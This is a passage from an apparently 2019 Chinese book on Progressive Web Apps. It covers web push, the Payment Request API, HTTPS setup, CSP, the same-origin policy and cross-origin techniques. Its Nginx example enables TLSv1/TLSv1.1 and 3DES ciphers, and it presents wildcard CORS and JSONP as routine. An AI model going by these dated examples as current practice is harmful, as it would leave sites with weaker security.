res.sendFile(path.resolve(__dirname, 'entry.js')) }) app.get('/service-worker.js', function (req, res) { res.sendFile(path.resolve(__dirname, 'service-worker.js')) }) // 启动服务器 app.listen(80, function () { console.log('服务端启动了') }) 准备好上述文件之后，配置完成后通过以下命令启动示例，在看到命令行中输出 Server start on: http://127.0.0.1:8088，意味着已经成功启动。 # 安装成功后启动 chapter06/web-push 示例 $ npm run server 这时打开浏览器，访问 http://127.0.0.1:8088 便开始注册 Service Worker、获取桌面通知权限、订阅推送；之后关闭网页，每间隔 10 分钟，后端服务都会向推送服务器发送消息，同时推送服务器将再将消息推送至浏览器，浏览器接收到消息之后将弹出桌面通知，显示文案 “我叫李雷，很高兴认识你” ；接着点击通知之后，将自动打开浏览器同时打开 http://127.0.0.1:8088。 这样，整个过程就实现了离线桌面通知的展示以及引导用户打开页面回到站点的流程。上述例子只是一个粗糙的功能演示，开发者可以顺着思路与具体的项目需求去活学活用这个强大的功能。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter06/5-payment-request-api.html":{"url":"chapter06/5-payment-request-api.html","title":"6.5 Payment Request API","keywords":"","body":"Payment Request API 对于用户留存来说，浏览器的支付功能就是培养用户习惯的利器，一旦用户习惯了在 Web 站点中可以直接使用支付 API 进行购物等消费活动，那么 Web 站点的用户留存率自然就提高了。 虽然目前各大现代浏览器对 Payment Request API 的支持度都还不是很完美，但是这也不妨碍我们去对它进行初步的尝试。本节将从以下几个方面对 Payment Request API 进行介绍： Payment Request API 解决的问题 Payment Request API 的简单使用 Payment Request API 安全性分析 Payment Request API 的未来展望 Payment Request API 解决的问题 顾名思义，很容易发现 Payment Request API 解决的问题就是支付的问题，而且是利用浏览器来解决这个问题。不同于手机 Native App 的支付，普通 PC 端和手机端的浏览器都能使用 Payment Request API 进行支付，这也是一大亮点。 那支付问题是什么呢？ 简单举个例子，现代社会很多人都会有网上购物的需求。如果我想在淘宝买东西，而且还是第一次，那么很有可能我就会去找个电脑，用浏览器打开淘宝，注册个账号然后开始逛淘宝。最后下单的时候，需要输入收货地址等一系列信息，然后提交。 然而问题远远没有结束，订单提交后支付问题接踵而至。由于是第一次逛淘宝，所以支付宝也没有，又得注册个账号，绑定银行卡信息，然后授权进行支付。这下可算买到东西了，但是逛京东的时候这些问题又来了，而且京东的界面和淘宝的界面还不一样，流程也不一样，用户体验也就因此不同，产生的实际收益也因此有所差异。如果是一些网站的支付体验特别差，那么可能直接造成用户的流失，这样就非常得不偿失了。另外，各个网站不同的支付 API 对于开发人员也是一种煎熬。 所以 Payment Request API 就是为了解决上述问题而被提出的。 简单来说，Payment Request API 就是以一套原生的支付界面代替了原来各个商家自己设计的界面，所以整个流程变得高度统一。填一次收货地址信息和银行卡信息就能在所有的网站中使用，这就是 Payment Request API 最大的魅力。 总的来说，Payment Request API 是新的浏览器标准，旨在取代各种商家的结账流程，提供统一的风格和体验。因此它具有如下几个特点： 使浏览器充当用户和商家的中介 使支付流程统一风格，形成标准 适合任何拥有浏览器的电子设备 可以对接各种不同的支付方式 Payment Request API 的简单使用 在使用 Payment Request API 之前，我们先来了解一下 Payment Request API 的整体使用流程。 商家为用户购买的商品创建 PaymentRequest ，其中包含金额、币种和支付方式等信息 浏览器确定兼容性后，展示支付界面 用户选择支付方式后确认执行或者取消交易 浏览器反馈用户支付的结果 创建 PaymentRequest Payment Request API 有一定的兼容性问题，所以下面的示例代码都是在支持 Payment Request API 的情况下运行的，如果使用者在生产环境下使用，请务必解决兼容性问题。 let request = new PaymentRequest( methodData, // 需要的支付方式 details, // 账单信息 options // 其他消息 ); 上述代码中，methodData 变量是一个数组，数组内的每一项都是一个字典，其中包含支持的支付方式和相应的各种信息。details 变量是交易的详细信息，包含的基本元素有id，displayItems，total，分别代表订单号、购买物品列表和总额。当然，details 还可以有一些其他信息，如快递信息等。options 变量也是一个字典，用来设置哪些信息需要用户填写。下面代码示例中的 options 就表明了用户需要输入姓名、手机号和送货信息。 function createPaymentRequest () { let methodData = [{ supportedMethods: 'basic-card', data: { supportedNetworks: ['visa', 'mastercard'], supportedTypes: ['debit', 'credit'], } }] let details = { id: 'order-2049', displayItems:[{ label: 'Mechanical Keyboard', amount: { currency: 'RMB', value: '999.00' } }], total: { label: 'total', amount: { currency: 'RMB', value: '999.00' } } } let options = { requestPayerEmail: false, requestPayerName: true, requestPayerPhone: true, requestShipping: true, } return new PaymentRequest(methodData, details, options) } 展示支付界面 function show () { let request = createPaymentRequest() request.show().then(function (paymentResponse) { handle(paymentResponse) }).catch(function (e) { console.log(e) }) } 展示支付界面是比较简单的，只要调用 PaymentRequest 的 show 方法即可。另外还有个 abort 方法，这是用来主动取消 PaymentRequest ，其目标使用场景可以是秒杀活动或商品售罄的情况。另外还有很多其他方法，这里不再赘述。 用户确认支付 在展示支付界面之后，一般是用户填写付款账号信息。如果不是第一次填写，还可以直接自动填充之前填好的信息。简单示例界面如下： 这个步骤就是 Payment Request API 提供的风格统一的支付界面。在这个步骤之后就是用户确认付款，一旦点击付款按钮，这操作就不可逆了。之后就是等待浏览器与运营商之间的交互，根据交互结果如何，我们分别给出应答界面。 浏览器反馈用户支付的结果 在 Payment Request API 中，浏览器作为中介，只是收集用户填写的信息，然后按照商家的要求发送到指定的服务器，等待他们的处理，处理完了之后，页面就会显示正确的信息。 这些过程简单来说就是上述示例代码中 handle 函数的作用。简单写个示例，如下： function handle (paymentResponse) { let data = { method: paymentResponse.methodName, details: paymentResponse.details } let init = { method: 'POST', body: JSON.stringify(data), credentials: 'include', headers: { 'content-type': 'application/json' } } return fetch('/payment', init) .then(function (res) { if (res.status === 200) { return res.json() } else { throw new Error('payment error') } }).then(function (res) { paymentResponse.complete('success') }, function (error) { paymentResponse.complete('fail') }) } Payment Request API 安全性分析 对于支付相关的问题，我相信很多人都会在意安全性如何。如果支付安全不能得到保障，那么提出这一系列的 API 就没有任何实际意义。 不过由于 Payment Request API 的规范还没有完全确定，所以目前考虑到的安全问题可能也不是十分全面，但也值得一提。 上文提到的 show 方法将会严格定义为在用户交互的情况下，才会被触发，这很好地防止了用户在未察觉的情况下被第三方调起支付界面。另外 Payment Request API 只会允许在安全的环境下运行，比如 HTTPS，因为一些敏感信息一旦是明文传输，那后果将不堪设想。针对跨域的支付请求，相关规范在提出的过程中被讨论了好多次。特别是 iframe 标签经常被商家用来和第三方支付机构通信，所以目前的标准准备在 iframe 标签上增加一个字段 allowpaymentrequest 来支持跨域的支付请求。 还有个人信息的保护在 Payment Request API 的规范中也被提及，像银行卡信息，快递信息等不会在用户没有感知的情况被分享出去。 当然也有一些安全相关的问题一直在被讨论着，比如 iframe 标签上的 sandbox 属性和 allowpaymentrequest 属性同时出场该如何表现的问题，在前不久才有明显的结论。Payment Request 的 GitHub 一直都有不错的活跃度，我们相信很多问题在不远的未来都能被很好的解决。 Payment Request API 的未来展望 根据 caniuse 的反馈，目前现代浏览器中还没有一个完全支持 Payment Request API，但是部分支持的范围已经达到了 74.74% ，国内的部分支持率也达到了 50.5% (截止到 2018-11-9 的数据)。由此可见，Payment Request API 正在稳步地发展中。不过在我运行上述示例代码的时候，需要事先开启 web-payments 功能，我的谷歌浏览器版本是 70，现代大多数浏览器都默认此功能是关闭的。 虽说 Payment Request API 支持的支付方式是挺多的，但是大多数第三方支付是银行，其他的一些第三方支付方式也需要自己跟进。支付宝就积极拥抱变化，Alipay Payment Method 在很早的时候就提出来了。 总的来说，Payment Request API 还是在慢慢地发展中，正如 PWA 的蓬勃发展，Payment Request API 也有一个美好的未来。 参考资料： CR-payment-request-20180830 Web Payments Overview from google Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"chapter07.html":{"url":"chapter07.html","title":"第7章 安全","keywords":"","body":"安全 上一章，我们介绍了 PWA 中与用户留存相关的内容。在构建 PWA 应用时，如何保证用户的信息安全，也是一个十分重要的话题。Web 应用程序的使用范围非常广泛，其安全问题也日益突显，代码中的细小漏洞随时可能被攻击者利用，导致用户的隐私信息泄露、财产损失。本章节将从以下几个角度入手，帮助您构建更加安全的 PWA 应用。 使用 HTTPS 保护站点安全 同源策略 CSP(内容安全策略) 典型的安全漏洞 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"chapter07/1-https.html":{"url":"chapter07/1-https.html","title":"7.1 使用 HTTPS 保护站点安全","keywords":"","body":"使用 HTTPS 保护站点安全 构建 PWA 应用时，HTTPS 是必不可少的条件之一。使用 HTTP 协议的应用存在着一定的安全隐患，这是因为 HTTP 本身不具备加密的功能，通信中使用明文传输请求和响应的内容，内容可能会被窃听，而且 HTTP 缺少对通信双方身份进行校验的环节，也无法证明报文内容的完整性，存在身份伪装和信息被篡改的风险。所以，我们应该严格地使用 HTTPS 协议来保护 PWA 的安全。 HTTPS 的概念 HTTPS 即 HTTP over SSL/TLS（Secure Socket Layer/Transport Layer Security），是 HTTP 的安全版本。SSL/TLS 是介于 TCP 和 HTTP 之间的一层安全协议，是一种使用比较广泛的安全技术，简单的说，是在 HTTP 上加了一层处理加密信息的模块，所以使用 HTTPS 基本上不需要对 HTTP 页面进行太多的改造。有些浏览器访问 HTTPS 的站点时，在地址栏的前面会有一把绿色的锁一样的标识，表明 HTTPS 生效了。 HTTPS 的主要作用是： 对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全; 对网站服务器进行真实身份认证。 它的核心 SSL/TLS 协议采用非对称加密方式。HTTPS 服务器拥有一张数字证书，该证书由客户端、服务端都信赖的第三方机构颁发，它包含了经过认证的网站公钥和一些元数据。公钥用来加密信息，可以提供给所有需要进行通信的客户端，私钥保存在本地，不能泄露。客户端使用这份公钥对信息进行加密，将请求发送给服务器，服务器用私钥解密。反之，服务器对客户端的返回，则使用客户端提供的公钥进行加密，客户端使用本地对应的私钥来解密，保证通信安全。 基于 SSL/TLS 进行一次的 HTTPS 会话的过程，简单地说可以分成几步： 客户端向服务器端索要并验证证书公钥，决定是否继续通信。 客户端生成 \"对话密钥\"，并用公钥加密返回给服务器。 服务器用私钥解密，获取密钥，使用密钥加密返回内容，返回给客户端。 客户端使用 \"对话密钥\" 解密内容，拿到结果。 如上流程，经过了身份认证、信息加密等步骤，网络通信安全就得到了保障。在这里涉及到一些重要的安全术语，如公钥/私钥、证书办法机构，我们需要了解一下。 公钥和私钥对 公钥/私钥对是一对很长的数字，可用作加密密钥和解密密钥，它们共用一种特别的数学关系。最常见的密钥对系统之一就是 RSA 加密系统。公钥用于加密消息，并且消息只能使用对应的私钥来解密。服务器会将其公钥公布出来，客户端（如浏览器）将使用此密钥来建立一个与服务器安全通信的通道。 证书颁发机构 证书颁发机构 (Certificate Authority) 是一个受信任的第三方组织，它为每个使用公开密钥的站点客户发放一个数字证书，数字证书的作用是证明该站点合法地拥有证书中列出的公开密钥，CA 机构的数字签名使得该证书不能被伪造和篡改。包含有 CA 本身公钥的信任锚存储库维护在客户端（如浏览器）上，这些公钥被用来验证站点证书的真伪。CA 是数据安全和 HTTPS 通信的重要组成部分和核心环节。 使用 HTTPS 的理由 了解了 HTTPS 的基本原理后，不难看出，HTTP 协议采用明文传输信息，存在信息窃听、信息篡改和信息劫持的风险，使用 HTTPS 对我们构建安全可靠的 PWA 站点有着多方面的收益。 确保站点安全。HTTPS 的通信信息都是加密传播，第三方无法窃听，且具有校验机制，一旦信息被篡改，通信双方就能立刻发现，这样就能够有效防止入侵者篡改网络通信内容。这些入侵者包括但不局限于恶意攻击者，合法但极具威胁的竞争对手，通信运营商等等。特别是在国内，运营商劫持插入广告信息的现象早已屡见不鲜，这些都能通过升级 HTTPS 来规避。 保护用户隐私。并不只是涉及到敏感数据的网站才需要升级 HTTPS，事实上每一个不受保护的 HTTP 请求都有暴露用户行为、用户身份的风险。虽然这些单个请求看起来没有什么敏感信息，但攻击者可以长期监视用户的浏览活动，通过收集大量数据推断用户的行为、地理位置、生活习惯等，从而造成用户的隐私信息泄露。 未来的趋势所在。将 Web 应用升级成为 HTTPS 是大势所趋，HTTPS 可以保障站点的安全、保护用户的隐私。随着 Web 应用平台的多元化发展，拍照、视频等功能都需要较高的用户权限许可，而使用 Service Worker 启用离线应用功能、构建 PWA 站点等已经将 HTTPS 视为必要条件。Google 早就倡议所有的 Web 站点都应该使用 HTTPS， 而且将 HTTPS 站点的搜索结果排名权重进行提升，想必在未来，这也是促进站长将站点进行 HTTPS 化的一个重要理由。 升级 HTTPS 通过上面的内容，对于 HTTPS 的概念和作用我们已经足够清楚了，接下来，我们介绍下将站点升级成 HTTPS 的一般步骤。 1.获取证书 前面提到过，HTTPS 是由证书认证机构 CA 颁发的、并包含公开密钥拥有者信息、公开密钥、签发者信息、有效期以及一些扩展信息、能提供在互联网上进行身份验证的一种权威性数字文件。要保证数字证书的真实性，必须确保该数字证书是由具有权威性的国际 CA 中心签发的，如 Symantec 就是这样一家通过 Web Trust 认证的国际 CA。购买 CA 颁发的证书有很多类型，分为域名认证、公司认证、扩展认证三个级别，还分成单域名、通配符、多域名三种覆盖范围。认证级别越高、覆盖范围越广的证书，价格越贵。如今，国内一些云服务供应商也提供了配套的免费或收费证书服务，可以选择的类型很多。 2.在服务器安装证书 根据 Web 服务器的类型不同，证书分为多种，我们只需要下载对应的证书文件，然后选择对应的服务器进行配置即可，Mozilla 便捷的配置生成器，列举了常见服务器的配置方式，对我们配置证书很有帮助。 我们以 Nginx 服务器的配置示例如下： server { listen 443 ssl http2; listen [::]:443 ssl http2; # certs sent to the client in SERVER HELLO are concatenated in ssl_certificate ssl_certificate /path/to/signed_cert_plus_intermediates; ssl_certificate_key /path/to/private_key; ssl_session_timeout 1d; ssl_session_cache shared:SSL:50m; ssl_session_tickets off; # Diffie-Hellman parameter for DHE ciphersuites, recommended 2048 bits ssl_dhparam /path/to/dhparam.pem; # intermediate configuration. tweak to your needs. ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers 'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS'; ssl_prefer_server_ciphers on; # HSTS (ngx_http_headers_module is required) (15768000 seconds = 6 months) add_header Strict-Transport-Security max-age=15768000; # OCSP Stapling --- # fetch OCSP records from URL in ssl_certificate and cache them ssl_stapling on; ssl_stapling_verify on; ## verify chain of trust of OCSP response using Root CA and Intermediate certs ssl_trusted_certificate /path/to/root_CA_cert_plus_intermediates; resolver ; .... } 3.重定向配置 接下来我们需要将 HTTP 的访问请求 301 到 HTTPS server { listen 80; server_name domain.com www.domain.com; return 301 https://domain.com$request_uri; } 4.修改资源链接 将站点所有的 HTTP 资源地址替换成 HTTPS，一个比较好的方法是直接将协议头替换成 //，这样浏览器会自动根据当前页面的协议加载相同协议头的资源，更为灵活。例如： 改为 如果修改不完全，HTTPS 资源和 HTTP 资源混合出现，即页面包含混合内容，浏览器将警告用户已失去 HTTPS 的全部能力（直观的看，地址栏 HTTPS 的标识将处于失效状态）。事实上，如果是主动混合内容（脚本、插件、CSS、iframe），则浏览器通常根本不会加载或执行此内容，从而导致页面残缺。 5.可以进一步保证安全：设置 Cookie 安全标记 如果用户的身份验证 Cookie 在明文中暴露，则整个会话的安全保障将被破坏，因此，应该确保浏览器只在使用 HTTPS 时，才发送 Cookie。 在网站响应头里面，Set-Cookie 字段加上 Secure 标志即可。 Set-Cookie: LSID=DQAAAK...Eaem_vYg; Secure 完成以上设置，重启服务器，HTTPS 就生效了。迁移成为 HTTPS 后，也不必过分担心额外的性能开销问题。HTTPS 和 HTTP 相比，在 TCP 三次握手的基础上，多了一个 SSL 握手的过程，主要是通信和加密有一定的时间损耗。而在页面内容和应用层性能优化得当的情况下，同时应用安全又得到了保障，总体的收益一定是积极和正向的。 避免 HTTPS 站点出现混合内容 前面升级 HTTPS 的过程中，需要将资源的协议头进行替换，我们提到了混合内容的概念。混合内容（Mixed Content）顾名思义：初始 HTML 内容通过安全的 HTTPS 连接加载，但其他资源（例如，图像、视频、样式表、脚本）则通过不安全的 HTTP 连接加载，即在同一个页面同时混合加载了 HTTP 和 HTTPS 资源。 混合图片内容，Chrome 给出警告： 对于混合脚本，Chrome 会阻止加载： 混合内容的存在会降低整个页面的安全性，因为这些请求容易受到 XSS，中间人等各种攻击。用户看到这些 Warning 的时候，如果存在威胁，很有可能已经被攻击。所以开发者有义务将资源替换成 HTTPS，减少安全风险。 考虑到这些威胁的存在，浏览器理应阻止所有混合内容的加载，但这会造成众多站点不可用。所以，当前大部分浏览器的策略是阻止最危险的混合内容类型（如 JavaScript 脚本），同时仍允许请求不太危险的混合内容类型（如图片等多媒体资源）。现代浏览器遵循混合内容规范，定义了可选择性地阻止的内容和可阻止的内容类别。 根据此规范，当前可选择性阻止的内容中仅包括图像、视频和音频资源以及预获取这些资源的链接等。随着时间的推移，此类别可能会缩小。可选择性阻止的内容以外的所有内容被视为可阻止的内容，将被浏览器阻止。 值得注意的是，不同浏览器供应商的不同版本的浏览器处理混合内容的方式不尽相同。所以对于开发者来说，修复 HTTPS 站点中的混合内容十分重要。 处理 HTTPS 站点中的混合内容 HTTPS 站点中的混合内容数量不多时，我们可以根据浏览器的 Warning 或 Error 提示，手动修改源码即可。如果想批量处理不安全的混合内容，则可以借助 CSP（Content Security Policy）即内容安全策略，下面简单介绍它在这种场景的使用，下一节我们将详细了解相关内容。 使用 CSP 查找混合内容 给网站设置响应头： Content-Security-Policy-Report-Only: default-src https: 'unsafe-inline' 'unsafe-eval'; report-uri https://example.com/reportingEndpoint 这样用户访问站点时，浏览器都会向 https://example.com/reportingEndpoint 发送请求，告诉你哪些内容不规范。 自动升级不安全的请求 可以使用 CSP 的 upgrade-insecure-requests 配置项，浏览器在请求 http 资源时，会自动升级请求对应的 HTTPS 资源。 如，配置请求头 Content-Security-Policy: upgrade-insecure-requests 或，使用meta标签 都能使浏览器将 的请求转化成 https://example.com/image.jpg。但注意，这时需要保证升级后的资源地址可用，不然就会请求失败。 阻止所有混合内容 对于不支持 upgrade-insecure-requests 属性的浏览器，还可以通过 CSP 的 block-all-mixed-content 属性来屏蔽所有的混合内容，有两种使用方式： 配置请求头 Content-Security-Policy: block-all-mixed-content 或，使用meta标签 这个属性将导致所有不安全的混合内容被浏览器阻止，很明显，它存在\"误杀\"的风险，慎重使用。 验证 HTTPS 借助 Chrome DevTools，我们可以方便地查看一个站点的 HTTPS 安全性，实现两个功能： 验证当前站点的 HTTPS 安全状况 查看连接和证书详情，找出具体的非 HTTPS 资源列表。 打开 Chrome DevTools 的 Security 面板，在 Overview 下面，可以看到站点整体的安全情况，如证书是否合法，连接是否安全，站点资源是否是 HTTPS 等，如下图所示。 可以点击 View certificate 查看站点的服务器证书信息。 不是 HTTPS 的站点会通过 This page is not secure 进行提示。如果一个 HTTPS 站点中包含了 HTTP 的资源，也就是我们提到的混合内容，站点仍会被标记为不安全。 我们可以点击 View request in Network Panel 来查看混合内容列表详情，作出对应的修改。 通过以上的步骤，我们就能很快发现站点中潜在的非 HTTPS 安全性问题，消除隐患。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter07/2-CSP.html":{"url":"chapter07/2-CSP.html","title":"7.2 内容安全策略","keywords":"","body":"内容安全策略 CSP（Content Security Policy）即内容安全策略，主要目标是减少、并有效报告 XSS 攻击，其实质就是让开发者定制一份白名单，告诉浏览器允许加载、执行的外部资源。即使攻击者能够发现可从中注入脚本的漏洞，由于脚本不在白名单之列，浏览器也不会执行该脚本，从而降低客户端遭受 XSS 攻击风险。 默认配置下，CSP 甚至不允许执行内联代码 ( 块内容，内联事件，内联样式)，以及禁止执行eval(), setTimeout 和 setInterval。为什么要这么做呢？因为制定来源白名单依旧无法解决 XSS 攻击的最大威胁：内联脚本注入。浏览器无法区分合法内联脚本与恶意注入的脚本，所以通过默认禁止内联脚本来有效解决这个问题。事实上我们并不推荐使用内联脚本混合的开发方式，使用外部资源，浏览器更容易缓存，对开发者也容易阅读理解，并且有助于编译和压缩。当然，如果不得不需要内联脚本和样式，可以通过设置 unsafe-inline，来解除这一限制。 CSP 提供了一系列的属性配置，从而实现精确地控制浏览器的资源加载行为。开发者只需要将特定的属性，组合成一条有效的安全策略字符串 policy，然后指定 Content-Security-Policy 头部即可使用，如： Content-Security-Policy: policy caniuse 提供了目前浏览器对 CSP 的支持情况，对于不支持 CSP 的浏览器以及未提供 CSP 头部的站点，将默认为网页内容使用标准的浏览器同源策略。 启用 CSP 有两种方法配置并启用 CSP 1.设置 HTTP 头的 Content-Security-Policy 字段（旧版 X-Content-Security-Policy） Content-Security-Policy: script-src 'self'; object-src 'none';style-src cdn.example.org third-party.org; child-src https://other.com 2.设置页面的 标签 这两种不同的方式制定了同一个 CSP 策略，该策略对资源的加载进行了一些限制，设置了 script-src: 'self'，只信任当前域名下的脚本，同时使用 object-src: 'none'，不允许加载任何插件资源（如object, embed, applet 等标签引入的 flash 等插件），再使用 style-src 属性限制样式文件只能来自 cdn.example.org 和 third-party.org，此外还用 child-src 限定 iframe 的来源必须是 https://other.com。 除了上述例子使用的属性之外，CSP 提供了很多可配置的选项来针对不同资源的加载进行限制，常见的有， child-src：限制 iframe 及 worker 线程的来源，替代已弃用的 frame-src connect-src：限制 XHR、WebSockets 和 EventSource 连接的来源 font-src：指定字体文件的来源 img-src：限定图像来源 media-src：限定媒体文件（音频和视频）的来源 object-src：插件（比如 Flash）来源 report-uri：用于指定在违反策略时浏览器发送报告的地址。此指令不能用于 标记。 script-src：限定脚本的来源 style-src：样式表 manifest-src：manifest 文件 每个配置项的源列表是一个字符串，指定了一个或多个主机（使用域名或 IP 地址）、协议和端口号。站点地址和端口号都可以使用通配符前缀 * 来表明所有合法端口都是有效来源。我们可以举几个例子来说明： http://*.example.com 匹配所有使用 http 协议加载 example.com 的子域名。 mail.example.com:443 匹配所有访问 mail.example.com 的 443 端口的源。 https://store.example.com 匹配 store.example.com 下所有使用 HTTPS 协议的资源。 注意，如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。除此之外，还有一些关键字的选项： 关键字 'self'：当前域名，需要加引号 关键字 'none'：禁止加载任何外部资源，需要加引号 如果不为某条配置设置具体的值，则默认情况下，该配置在运行时认为你指定 * 作为有效来源（例如，你可以从任意位置加载字体，没有任何限制）。也可以设置 default-src 的值，来代替各个选项的默认值。例如，如果我们将 default-src 设为 https://example.com，并且没有指定 font-src 的值，那么站点将只允许加载来自 https://example.com 的字体。不过也有一些选项不使用 default-src 作为默认回退值，也就是说，不进行设置的话就会加载任何内容。比如： base-uri form-action frame-ancestors plugin-types report-uri sandbox 这里对 CSP 的属性内容作了比较全面的介绍：https://www.w3.org/TR/CSP/，值得一提的是，使用 CSP 时需要考虑到兼容性问题，兼容性的情况可参阅：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#浏览器兼容性。 发送报告 默认情况下，违背 CSP 策略的站点并不会发送报告。我们可以指定 report-uri 属性，并提供至少一个 URI 地址去递交报告： Content-Security-Policy: default-src 'self'; report-uri https://yourwebsite.com/csp/report 报告请求将以 POST 的形式发送，包含的 JSON 格式数据有以下字段： document-uri：发生违规的文档的 URI。 referrer：违规发生处的文档引用（地址）。 blocked-uri：被 CSP 阻止的资源 URI。如果被阻止的 URI 来自不同的源而非文档 URI，那么被阻止的资源 URI 会被删减，仅保留协议，主机和端口号。 violated-directive：违反的策略名称。 original-policy：在 Content-Security-Policy HTTP 头部中指明的原始策略。 值得注意的是，report-uri 不能在 meta 中设置，需要在请求头中指定才会生效。此外，如果我们只想对当前网站做一个测试，仅发送不符合 CSP 策略的报告，而不强制执行限制，可以设置 Content-Security-Policy-Report-Only 请求头代替 Content-Security-Policy，如下： Content-Security-Policy-Report-Only: default-src 'self'; ...; report-uri https://yourwebsite.com/csp/report; Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-05 11:04:20 "},"chapter07/3-policy.html":{"url":"chapter07/3-policy.html","title":"7.3 同源策略","keywords":"","body":"同源策略 上一节介绍 CSP 时，我们提到了浏览器的同源策略，同源策略是 Web 安全的基础，它对从一个源加载的资源如何与来自另一个源的资源进行交互做出了限制。这是一个用于隔离潜在恶意文件的关键安全机制，每个源均与其他网络保持隔离，从而为开发者提供一个可进行构建和操作的安全沙盒。 如果没有同源策略，Web 世界就变得非常不安全，拿浏览器中的 cookie 来说，当你登录 A 网站，同时打开 B 网站，B 网站能获取你 A 网站的 cookie，盗取你的身份凭证进行非法操作。 同源策略只是一个规范，虽然并没有指定其具体的使用范围和实现方式，但各个浏览器厂商都针对同源策略做了自己的实现。 同源的定义 如果两个页面的协议（protocol），端口（port）和主机（host）都是相同的，则两个页面具有相同的源。 例如，相对于 http://www.example.com/dir/page.html 同源情况如下 地址 结果 http://www.example.com/dir2/other.html 同源 http://v2.www.example.com/dir/other.html 不同源（主机不同） https://www.example.com/dir/other.html 不同源（协议不同） http://www.example.com:81/dir/other.html 不同源（端口不同） 限制范围 同源策略限制了不同源之间的交互，主要分成三类： 通常允许跨域写操作。如链接、重定向和表单提交。 通常允许特定的跨域资源嵌入。如 script、img 标签等。 通常不允许跨域读操作。但常可以通过内嵌资源来巧妙的进行读取访问。 不受同源策略限制，可以通过跨域资源嵌入的方式访问的资源常见的有： 标签嵌入跨域脚本 标签嵌入CSS ，， 标签嵌入图片、视频、音频资源 , 和 标签嵌入插件 @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。 和 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 非同源的网站，常见的主要有以下几种行为受到限制： 无法共享 Cookie, LocalStorage, IndexedDB 无法操作彼此的 DOM 元素 无法发送 Ajax 请求 跨域访问 同源策略做了很严格的限制，但在实际的场景中，又确实有很多地方需要突破同源策略的限制，也就是我们常说的跨域。实现跨域通信的解决方案有多种，我们可以简单的介绍几种方式。 更改源 页面可以更改自己的源，但会受到一些限制。比如，可以使用 document.domain 来设置子域的 domain 值，允许其安全访问其父域。例如： 可以在 http://child.company.com/dir/a.html中执行： document.domain = 'company.com' 页面将与 http://company.com/dir/b.html 处于相同的域。但是，试图给 company.com 设置 document.domain 为 anotherCompany.com 是不可行的，因为它不是 company.com 的父域。值得注意的是，浏览器的端口号是单独保存的，在给 document.domain 赋值时，如果不指明端口号，默认会以 null 值覆盖掉原来的端口号。因此 company.com:8080 不能仅通过设置 document.domain = \"company.com\" 来与 company.com 通信。必须在他们双方中都进行赋值，以确保端口号都为 null。 所以这种方法是有很大限制条件的，document.domain 这个值只能修改为这个页面的当前域或者当前域的超级域。所以，这个方法只能解决同一超级域下的页面跨域问题。 CORS CORS（Cross-Origin Resource Sharing）是 W3C 提出的一个用于服务端控制数据跨域传输的一个机制。它的原理是给 HTTP 头增加特定的值，让服务端来定义允许来自哪些源的请求。这是一种最为常见的处理跨域 Ajax 请求的方式。 举例来说，当我们试图在 example.com 的页面向 anotherexample.com 的接口发起 Ajax 请求时： let xhr = new XMLHttpRequest() let url = 'http://anotherexample.com/some/api/' xhr.open('GET', url, true) xhr.onreadystatechange = handler xhr.send() 在 anotherexample.com 的服务端没有进行任何设置的情况下，这个请求会因为跨域而失败。CORS 允许我们在请求头中设置 Access-Control-Allow-Origin，来控制允许哪些源的请求。我们可以用如下方式，设置允许所有的源。 Access-Control-Allow-Origin: * 当然也可以直接设置成允许的域的名称，或者配合 Origin 请求头使用。 JSONP JSONP 是 JSON with Padding 的简称，它的本质是利用内嵌的 资源不受同源政策影响，将接口需要返回的数据用指定名称的函数包裹起来进行传递，从而实现跨域接口请求。其基本原理可以简单描述如下： 客户端通过 script 标签发起跨域请求 服务端接收 callback 参数，将数据用 callback 名称包裹返回，形如： myFunction({ foo: 'bar' }) 客户端定义了 myFunction 函数，就会执行并拿到数据了： let mycallback = function (data){ alert(data.foo) } 实际使用的时候，不需要我们来实现这些繁琐的步骤，常见的第三方工具库如 JQuery，axios 等，都进行了封装，只需按照指定格式调用即可。需要注意，这种跨域方式需要后端的配合，因为后端的接口需要根据约定的参数获取回调函数名，然后跟返回数据进行拼接，最后进行响应。 window.postMessage postMessage 是 HTML5 的一个接口，它主要用于跨域文档（如不同源的 iframe）间的通讯，它可以把纯文本消息从一个域发送到另外一个域，不受同源策略的限制。如，在 example.com 页面下试图向 iframe 中的 